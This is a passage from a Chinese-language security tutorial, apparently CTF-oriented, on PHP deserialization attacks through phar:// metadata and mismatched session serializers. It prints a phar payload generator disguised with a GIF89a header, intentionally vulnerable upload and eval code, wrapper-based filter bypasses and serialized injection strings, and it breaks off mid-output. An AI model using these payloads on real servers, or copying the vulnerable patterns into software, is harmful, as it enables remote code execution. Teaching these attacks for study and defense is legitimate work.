RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><h2 id="3-2-phar-文件结构"><a href="#3-2-phar-文件结构" class="headerlink" title="3.2 phar 文件结构"></a>3.2 phar 文件结构</h2><ul><li><p>a stub</p><p>phar 文件的标志，前面内容不限，必须以 __HALT_COMPILER();?&gt; 结尾，否则 phar 扩展将无法识别该文件是 phar文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure></li><li><p>a manifest describing the contents</p><p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点。</p><p><img src="https://i.loli.net/2021/08/16/Iv3lNjUXtFoZpcw.png" alt="image-20210816144952619"></p></li><li><p>the file contents</p><p>所被压缩的文件内容，在无特殊要求的情况下，该内容可随意写</p></li><li><p>a signature for verifying Phar integrity</p><p>签名格式，位于末尾</p><p><img src="https://i.loli.net/2021/08/16/ROTrMWvjBeo1pmK.png" alt="image-20210816145202078"></p></li></ul><h2 id="3-3-测试：phar-文件的构造"><a href="#3-3-测试：phar-文件的构造" class="headerlink" title="3.3 测试：phar 文件的构造"></a>3.3 测试：phar 文件的构造</h2><ul><li><p>条件：php.ini</p><p><img src="https://i.loli.net/2021/08/16/zHR9QuMXmZEYaSO.png" alt="image-20210816145304311"></p></li></ul><p><strong>编写 生成 .phar 文件</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;1.phar&quot;</span>); <span class="comment">//后缀必须为 .phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">// 设置 stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$o</span>-&gt;data = <span class="string">&#x27;hacker123!&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的 meta-data 存入 manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名将自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问过后，会在当前目录下生成 <code>1.phar</code> 文件，打开，看其内容</p><p><img src="https://i.loli.net/2021/08/16/fIErdgbOZQ3Gs7t.png" alt="image-20210816150109626"></p><p><strong>发现，meta-data 是以序列化的形式存储的</strong></p><p><strong>那么，在哪里进行反序列化？</strong></p><p><strong>phar://协议读取文件</strong></p><ul><li><p>php 大部分的文件系统函数在通过 <code>phar://</code> 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，经测试后，所受影响的函数有</p><p><img src="https://i.loli.net/2021/08/16/Gg6PJzalCAp9mhr.png" alt="image-20210816150354206"></p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://1.phar&#x27;</span>);<span class="comment">//phar:// 触发：进行反序列化</span></span><br></pre></td></tr></table></figure><p>访问，成功触发了反序列化，得到 </p><p><img src="https://i.loli.net/2021/09/10/ev7ay5QxkIJBdtG.png" alt="image-20210816150553492"></p><h2 id="3-4-常见利用：文件上传-文件包含"><a href="#3-4-常见利用：文件上传-文件包含" class="headerlink" title="3.4 常见利用：文件上传+文件包含"></a>3.4 常见利用：文件上传+文件包含</h2><p><strong>环境：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload_file.php <span class="comment"># 后端检测文件上传,确保文件类型及后缀是 .gif</span></span><br><span class="line">upload_file.html <span class="comment">#文件上传表单前端</span></span><br><span class="line">file_un.php  <span class="comment">#存在 file_exists() 以及  __destruct() 用以phar://伪协议读取文件内容</span></span><br></pre></td></tr></table></figure><p><strong>利用条件：</strong></p><ul><li>存在文件上传</li><li>存在 <code>file_exists()  fopen()  file_get_contents()  file()</code> 等文件操作函数</li><li><code>phar://</code> 等字符未被过滤</li></ul><p><strong>upload_file.php</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+1))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Temp file: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>upload_file.html</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://localhost:8080/ctf/phar/upload_file.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;Upload&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p><strong>file_un.php</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlihgt_file(__FILE__);</span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure><p><strong>题目：</strong></p><p><img src="https://i.loli.net/2021/08/16/dOqcxFjsStoZmlM.png" alt="image-20210816151653686"></p><p><strong>生成 .phar 文件：</strong>phar.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//highlihgt_file(__FILE__);</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;hack.phar&quot;</span>); <span class="comment">//后缀必须为 .phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="comment">// 设置 stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> AnyClass();</span><br><span class="line"><span class="variable">$o</span>-&gt;output = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="comment">//签名2将自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>访问，得到 hack.phar</p><p><img src="https://i.loli.net/2021/08/16/FAST5wPB3aQu2IE.png" alt="image-20210816152258664"></p><p>将 hack.phar 后缀修改为 hack.gif</p><p>在 upload_file.html 里上传</p><p><img src="https://i.loli.net/2021/08/16/8q7iuL96Xj4CeSg.png" alt="image-20210816152845318"></p><p><img src="https://i.loli.net/2021/08/16/YRJEP4uIzharXQM.png" alt="image-20210816152858027"></p><p>然后我们进入 file_un.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=phar://hack.gif</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/16/pZsvBjrJdhXlWcM.png" alt="image-20210816153008894"></p><p>可以看到，命令成功执行</p><h2 id="3-5-绕过姿势：过滤-phar"><a href="#3-5-绕过姿势：过滤-phar" class="headerlink" title="3.5 绕过姿势：过滤 phar"></a>3.5 绕过姿势：过滤 phar</h2><ul><li>当题目环境限制 phar 不能出现在前面的字符里，即无法使用 <code>phar:// 协议</code>  ，可以使用 <code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br></pre></td></tr></table></figure><ul><li><p>当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure></li><li><p>GIF格式验证可以通过在文件头部添加GIF89a绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="variable">$phar</span>-&gt;setStub(“GIF89a”.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、生成一个phar.phar，修改后缀名为phar.gif</span><br></pre></td></tr></table></figure></li></ul><h2 id="3-6-php-session-反序列化"><a href="#3-6-php-session-反序列化" class="headerlink" title="3.6 php-session 反序列化"></a>3.6 php-session 反序列化</h2><p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p><p><a href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral">https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral</a></p><p><a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md">https://github.com/80vul/phpcodz/blob/master/research/pch-013.md</a></p><h3 id="3-6-1-关于-php-中的-session-存储机制"><a href="#3-6-1-关于-php-中的-session-存储机制" class="headerlink" title="3.6.1 关于 php 中的 session 存储机制"></a>3.6.1 关于 php 中的 session 存储机制</h3><p><strong>session 介绍：</strong></p><blockquote><p>在计算机中，尤其是在网络应用中，称为“<strong>会话控制</strong>”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p><p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，<strong>将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。</strong>当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p></blockquote><p><strong>php 中的 session 存储相关匹配值：</strong></p><p>PHP 版本 &gt;= 5.4 中有关 session 的相关配置：php.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line"><span class="comment"># enabled = on 表示 upload_progress 功能开启，即当浏览器向服务器上传一个文件时，php 会把此次文件上传的详细信息，如上传时间、上传进度等都储存在 session中</span></span><br><span class="line"></span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line"><span class="comment"># cleanup = on 当文件上传结束之后， oho 会立即将对应的 session 文件清空</span></span><br><span class="line"></span><br><span class="line">3. session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line">4. session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="comment"># name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span></span><br><span class="line"><span class="comment"># 重点：prefix+name将表示为session中的键名</span></span><br><span class="line"></span><br><span class="line">5. session.upload_progress.freq = <span class="string">&quot;1%&quot;</span></span><br><span class="line">6. session.upload_progress.min_freq = <span class="string">&quot;1&quot;</span></span><br><span class="line">7. session.use_strict_mode=off </span><br><span class="line"><span class="comment"># 表示我们对 Cookie 中的 session 是可控的</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. session.save_path=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 设置 session 的储存路径</span></span><br><span class="line"></span><br><span class="line">2. session.save_handler=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span></span><br><span class="line"></span><br><span class="line">3. session.auto_start</span><br><span class="line"><span class="comment"># boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span></span><br><span class="line"></span><br><span class="line">4. session.serialize_handler</span><br><span class="line"><span class="comment"># string --定义用来序列化/反序列化的处理器名字。默认使用php</span></span><br></pre></td></tr></table></figure><p>php 版本为 5.4.45 的部分默认配置如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;session.save_path = <span class="string">&quot;/tmp&quot;</span></span><br><span class="line">session.save_handler = files</span><br><span class="line">session.auto_start = 0</span><br><span class="line">session.serialize_handler = php</span><br></pre></td></tr></table></figure><p><code>session.serialize_handler = php</code> 该选项是用来设置 session 的 <code>序列化引擎</code> 的，除了默认的 php 引擎之外，也存在其他的，不同的 引擎对应的 session 的存储方式不同。</p><p><strong>其它存储引擎如下</strong>：</p><ul><li><strong>php_binary</strong>:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</li><li><strong>php</strong>:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li><li><strong>php_serialize(php&gt;5.5.4)</strong>:存储方式是，经过serialize()函数序列化处理的值</li></ul><p>如果需要修改该引擎，须有手动添加代码 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code>，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"> session_start();</span><br></pre></td></tr></table></figure><p>下面我们仅仅讨论 php 引擎所引起的 反序列化。</p><p><strong>php 中的 session 存储机制：</strong></p><p>php 中的 session 中的内容不是存在内存当中的，而是以文件的形式进行存储，存储方式是由配置项 <code>session.save_handler</code> 来进行确定的，默认以文件的方式存储。所存储的文件名是以 <code>sess_sessionid</code> 来进行命名的，文件的内容就是 session 值得序列化之后的内容。</p><p><img src="https://i.loli.net/2021/09/12/VwE3NXjsbhq5KoJ.png" alt="image-20210912093352903"></p><p>例如：客户端的用户进行抓包，在 <code>Cookie</code> 字段中进行设置 <code>PHPSESSION=test</code> ，则 服务器上就将会创建一个文件 <code>/tmp/sess_test</code> 文件，用于存储 用户的 SESSIONS 信息。</p><p>测试：PHP 7.3.4             </p><p><strong>php 默认引擎下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/12/TNsWVOG8L9oZwQ3.png" alt="image-20210912100023408"></p><p>session 文件中其中，<code>name</code> 是键名，<code>s:4:&quot;test&quot;;</code> 是 <code>serialize(&quot;test&quot;)</code> 的结果。</p><p><strong>php_serialize 引擎下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"> session_start();</span><br><span class="line"> <span class="variable">$SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/12/ARNKoeV6fZXclxU.png" alt="image-20210912100614688"></p><p>session 文件内容是 a:1:{s:4:”name”;s:4:”test”;}，其中 </p><p><code>a:1</code> 只要是使用 php_serialize 引擎都会加上的，然后使用 php_serialize 引擎将会把 session 中的键名和键值都进行反序列化。</p><p><strong>在php_binary引擎下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"> session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/12/CVnR1U5O6mioqtc.png" alt="image-20210912101016728"></p><p>session 文件内容是 names:4:”test”;</p><p>由于<code>name</code>的长度是4，4在ASCII表中对应的就是<code>EOT</code>。根据php_binary的存储规则，最后就是<code>names:6:&quot;spoock&quot;;</code>。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧)</p><h3 id="3-6-2-php-session-序列化简单测试：利用原理"><a href="#3-6-2-php-session-序列化简单测试：利用原理" class="headerlink" title="3.6.2 php-session 序列化简单测试：利用原理"></a>3.6.2 php-session 序列化简单测试：利用原理</h3><p><strong>序列化简单测试：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">lover</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;func = <span class="string">&#x27;phpinfo()&#x27;</span>;    </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以传入：<code>?a=O:5:&quot;lover&quot;:1:&#123;s:4:&quot;func&quot;;s:14:&quot;echo%20&quot;spoock&quot;;&quot;;&#125;</code></p><p>则将会在页面中输出 <code>spoock</code> 。</p><p><strong>php session 反序列化构造：</strong></p><p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。<br><strong>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确的进行反序列化。</strong>通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。</p><p>示例：</p><p>假如 题目本身是 php_serialize 的存储引擎，如果我们注入数据：<code>a=|o:4:&quot;test&quot;:0:&#123;&#125;</code></p><p>则 其通过 php_serialize 的引擎处理过后，将会变成 <code>a:1:&#123;s:1:&quot;a&quot;;a:16:&quot;|o:4:&quot;test&quot;:0:&#123;&#125;&quot;&#125;</code></p><p>随后 如果我们利用 php 的存储引擎来读取，那么经过解读之后将会理解为 ： <code>&#123;s:1:&quot;a&quot;;a:16:&quot;</code>  是键名，而 | 后面的就会被理解为一个对象的实例化注入。</p><p><strong>测试 ：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>访问 ?a=|o:4:”test”:0:{}</p><p>此时 session 文件内容为 a:1:{s:1:”a”;a:16:”|o:4:”test”:0:{}”}</p><p>设置 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> ，即使用 php 引擎读取，再次访问即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [<span class="string">&quot;a:1:&#123;s:1:&quot;</span>a<span class="string">&quot;;a:16:&quot;</span><span class="string">&quot;]=&gt;</span></span><br><span class="line"><span class="string">  object(stdClass)#1 (0) 